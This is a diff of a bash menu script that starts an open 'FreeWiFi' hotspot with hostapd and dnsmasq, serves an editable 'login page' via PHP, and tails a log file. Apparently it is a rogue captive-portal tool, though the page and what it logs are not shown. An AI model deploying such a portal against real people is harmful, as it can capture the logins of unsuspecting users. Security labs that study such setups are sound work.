@@ -2,69 +2,53 @@
 
 PORTAL_DIR="portal"
 LOG_FILE="logs/log.txt"
+HOTSPOT_IFACE="wlp4s0"
+SSID="FreeWiFi"
+
+HOSTAPD_CONF="/tmp/hostapd.conf"
+DNSMASQ_CONF="/tmp/dnsmasq.conf"
 
 # ---------------------------
-# Detect Wi-Fi interfaces
-# ---------------------------
-detect_wifi_interfaces() {
-    echo "[+] Detecting Wi-Fi interfaces..."
-    mapfile -t INTERFACES < <(iw dev | awk '$1=="Interface"{print $2}')
-    if [ ${#INTERFACES[@]} -eq 0 ]; then
-        echo "[-] No Wi-Fi interfaces found!"
-        exit 1
-    fi
-
-    echo "Available Wi-Fi interfaces:"
-    for i in "${!INTERFACES[@]}"; do
-        echo "$i) ${INTERFACES[$i]}"
-    done
-
-    read -p "Select interface for hotspot: " idx
-    HOTSPOT_IFACE="${INTERFACES[$idx]}"
-    echo "[+] Hotspot will use $HOTSPOT_IFACE"
-}
-
-# ---------------------------
-# Setup folders/files
+# Setup folders and install dependencies
 # ---------------------------
 setup() {
-    echo "[+] Setting up..."
+    echo "[+] Setting up folders..."
     mkdir -p "$PORTAL_DIR" logs
     touch "$LOG_FILE"
     chmod 666 "$LOG_FILE"
+
+    echo "[+] Installing dependencies..."
     sudo apt update
     sudo apt install hostapd dnsmasq php-cli -y
     echo "[+] Setup complete!"
 }
 
 # ---------------------------
-# Create configs
+# Create hostapd and dnsmasq configs
 # ---------------------------
 create_configs() {
-    HOSTAPD_CONF="/tmp/hostapd.conf"
-    DNSMASQ_CONF="/tmp/dnsmasq.conf"
-
-    cat > $HOSTAPD_CONF <<EOF
+cat > $HOSTAPD_CONF <<EOF
 interface=$HOTSPOT_IFACE
 driver=nl80211
-ssid=FreeWiFi
+ssid=$SSID
 hw_mode=g
 channel=6
 auth_algs=1
 ignore_broadcast_ssid=0
 EOF
 
-    cat > $DNSMASQ_CONF <<EOF
+cat > $DNSMASQ_CONF <<EOF
 interface=$HOTSPOT_IFACE
 dhcp-range=192.168.50.2,192.168.50.50,255.255.255.0,12h
 EOF
 }
 
 # ---------------------------
-# Start hotspot
+# Start hotspot (hotspot-only mode)
 # ---------------------------
 start_hotspot() {
-    echo "[+] Starting hotspot..."
+    echo "[+] Starting hotspot on $HOTSPOT_IFACE (hotspot-only)..."
+
     create_configs
 
     sudo ip link set $HOTSPOT_IFACE down
@@ -75,20 +59,22 @@ start_hotspot() {
     sudo hostapd $HOSTAPD_CONF -B
     sudo dnsmasq -C $DNSMASQ_CONF
 
-    echo "[+] Hotspot started on $HOTSPOT_IFACE (Open, no password)"
+    echo "[+] Hotspot started. Devices can connect to $SSID."
+    echo "    IP range: 192.168.50.2 - 192.168.50.50"
 }
 
 # ---------------------------
 # Stop hotspot
 # ---------------------------
 stop_hotspot() {
+    echo "[+] Stopping hotspot..."
     sudo pkill hostapd
     sudo pkill dnsmasq
     echo "[+] Hotspot stopped."
 }
 
 # ---------------------------
-# Start login page
+# Start login page server
 # ---------------------------
 start_server() {
     if [ ! -d "$PORTAL_DIR" ]; then
@@ -108,7 +94,7 @@ show_devices() {
 }
 
 # ---------------------------
-# Logs
+# View / live logs
 # ---------------------------
 view_logs() { cat "$LOG_FILE"; }
 live_logs() { tail -f "$LOG_FILE"; }
@@ -119,31 +105,29 @@ edit_page() { nano "$PORTAL_DIR/index.html"; }
 # ---------------------------
 while true; do
     echo ""
-    echo "====== Wi-Fi Portal Tool ======"
+    echo "====== Hotspot-Only WiFi Portal Tool ======"
     echo "1) Setup"
-    echo "2) Select Hotspot Interface"
-    echo "3) Start Hotspot"
-    echo "4) Stop Hotspot"
-    echo "5) Start Login Page"
-    echo "6) Show Devices"
-    echo "7) View Logs"
-    echo "8) Live Logs"
-    echo "9) Edit Page"
-    echo "10) Exit"
-    echo "=============================="
+    echo "2) Start Hotspot"
+    echo "3) Stop Hotspot"
+    echo "4) Start Login Page"
+    echo "5) Show Connected Devices"
+    echo "6) View Logs"
+    echo "7) Live Logs"
+    echo "8) Edit Page"
+    echo "9) Exit"
+    echo "=========================================="
     read -p "Select option: " choice
 
     case $choice in
         1) setup ;;
-        2) detect_wifi_interfaces ;;
-        3) start_hotspot ;;
-        4) stop_hotspot ;;
-        5) start_server ;;
-        6) show_devices ;;
-        7) view_logs ;;
-        8) live_logs ;;
-        9) edit_page ;;
-        10) exit ;;
+        2) start_hotspot ;;
+        3) stop_hotspot ;;
+        4) start_server ;;
+        5) show_devices ;;
+        6) view_logs ;;
+        7) live_logs ;;
+        8) edit_page ;;
+        9) exit ;;
         *) echo "Invalid option" ;;
     esac
 done
